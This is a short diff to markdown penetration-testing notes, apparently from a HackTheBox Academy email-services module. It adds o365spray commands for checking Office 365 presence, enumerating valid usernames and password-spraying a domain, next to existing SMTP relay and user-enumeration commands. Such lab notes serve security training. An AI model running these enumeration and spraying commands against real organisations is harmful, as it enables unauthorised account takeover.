@@ -36,8 +36,18 @@ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
 smtp-user-enum -M RCPT -U <path_to_userlist> -D <domain> -t <ip>
 ```
 
--Using o365spray to target Microsoft Office 365:
+-Using o365spray to validate existence of Microsoft Office 365:
 ```
 python3 o365spray.py --validate --domain <domain>
+```
+
+-Using o365spray to identify valid usernames:
+```
+python3 o365spray.py --enum -U <path_to_userlist> --domain <domain>
+```
+
+-Using o365spray to perform password spraying:
+```
+python3 o365spray.py --spray -U <path_to_userlist> -p '<password>' --count 1 --lockout 1 --domain msplaintext.xyz
 ```
 Ref: https://academy.hackthebox.com/app/module/112/section/1072
